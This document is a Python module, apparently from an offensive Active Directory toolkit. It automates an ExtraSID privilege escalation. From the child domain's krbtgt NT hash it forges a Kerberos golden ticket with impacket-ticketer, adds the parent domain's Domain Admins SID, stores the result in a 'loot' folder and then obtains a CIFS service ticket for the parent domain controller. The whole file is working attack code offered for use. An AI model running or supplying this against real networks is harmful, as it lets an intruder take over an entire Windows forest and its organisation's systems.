# modules/extrasid.py

import os
import subprocess
import re
import shutil
from rich import print
from core.colors import red, green, yellow, blue

def is_valid_sid(sid):
    return bool(re.match(r"^S-\d-\d+(-\d+){1,}$", sid))

def run(session):
    print(blue("[*] Preparing ExtraSID privilege escalation attack..."))

    child_domain = session.domain
    dc_ip = session.dc_ip
    username = session.username

    print(f"[*] Current domain: {child_domain}, user: {username}")

    nthash = input("[?] Enter NT hash of krbtgt for child domain: ").strip()
    parent_domain = input("[?] Enter parent domain FQDN (e.g., finance.corp): ").strip()
    child_sid = input("[?] Enter Child Domain SID: ").strip()
    parent_sid = input("[?] Enter Parent Domain SID: ").strip()

    if not all([is_valid_sid(child_sid), is_valid_sid(parent_sid)]):
        print(red("[-] One or more SIDs are invalid. Aborting."))
        return

    if len(nthash) != 32 or not all(c in "0123456789abcdefABCDEF" for c in nthash):
        print(red("[-] NT hash appears invalid. Must be 32 hex chars."))
        return

    if not shutil.which("impacket-ticketer") or not shutil.which("impacket-getST"):
        print(red("[-] Required Impacket tools (impacket-ticketer / impacket-getST) not found in PATH."))
        return

    ticket_file = f"loot/{username}_extratgt.ccache"
    tgt_cmd = [
        "impacket-ticketer",
        "-domain", child_domain,
        "-nthash", nthash,
        "-domain-sid", child_sid,
        "-user-id", "500",
        "-groups", "512",
        "-extra-sid", f"{parent_sid}-512",
        "-outputfile", ticket_file.replace(".ccache", ""),
        username
    ]

    print(blue("[*] Generating forged TGT with impacket-ticketer..."))
    try:
        subprocess.run(tgt_cmd, check=True)
        if os.path.exists(ticket_file):
            print(green(f"[+] TGT created and saved to: {ticket_file}"))
        else:
            print(red("[-] TGT file not created. Something went wrong."))
            return
    except subprocess.CalledProcessError as e:
        print(red(f"[-] impacket-ticketer failed: {e}"))
        return

    # Load ticket in memory
    os.environ["KRB5CCNAME"] = os.path.abspath(ticket_file)
    os.putenv("KRB5CCNAME", os.path.abspath(ticket_file))

    spn = f"CIFS/{parent_domain.split('.')[0]}-dc.{parent_domain}"
    getst_cmd = [
        "impacket-getST",
        "-spn", spn,
        "-k", "-no-pass",
        f"{child_domain}/{username}"
    ]

    print(blue(f"[*] Requesting ST for {spn} with impacket-getST..."))
    try:
        subprocess.run(getst_cmd, check=True)
        print(green("[+] Service ticket (ST) obtained successfully."))
        print(yellow("[*] You can now use KRB5CCNAME for privileged access on the parent domain."))
    except subprocess.CalledProcessError as e:
        print(red(f"[-] impacket-getST failed: {e}"))
